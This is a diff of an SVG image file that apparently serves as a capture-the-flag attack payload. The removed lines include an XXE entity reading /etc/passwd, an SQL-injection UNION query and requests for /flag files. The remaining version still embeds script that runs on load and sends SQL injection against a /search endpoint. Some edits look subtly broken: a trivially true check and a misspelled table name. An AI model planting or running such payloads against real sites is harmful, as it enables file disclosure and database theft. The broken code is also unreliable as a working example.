@@ -1,32 +1,25 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-  <!ENTITY sqlpayload "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --">
-]>
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
   <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red"/>
-  <text x="10" y="20" font-size="5">Data: &xxe;</text>
   <script><![CDATA[
-    async function tryAllEndpoints() {
+
+
+   async function tryAllEndpoints() {
+   
       // 2. Try the search endpoint with SQLi
       try {
-        const sqlQuery = "&sqlpayload;";
+        const sqlQuery = "' UNION SELECT name, sql FROM sqlitemaster WHERE type='table' --";
         const searchResp = await fetch('/search?q=' + encodeURIComponent(sqlQuery));
         const searchData = await searchResp.text();
         alert('Search endpoint response length: ' + searchData.length);
-        if (searchData.includes('flag_') || searchData.includes('FLAG_')) {
+        if (searchData.includes('') && searchData.includes('flag_')) {
           alert('Found promising data in search response!');
         }
-        
-        // Try to extract the flag directly
-        fetch('/flag').then(r => r.text()).then(t => alert('Flag endpoint: ' + t));
-        
-        // Try common flag locations
-        fetch('/flag.txt').then(r => r.text()).then(t => alert('Flag file: ' + t));
       } catch (e) {
         alert('Error with search endpoint: ' + e.message);
       }
+      
     }
     tryAllEndpoints();
+
   ]]></script>
 </svg>
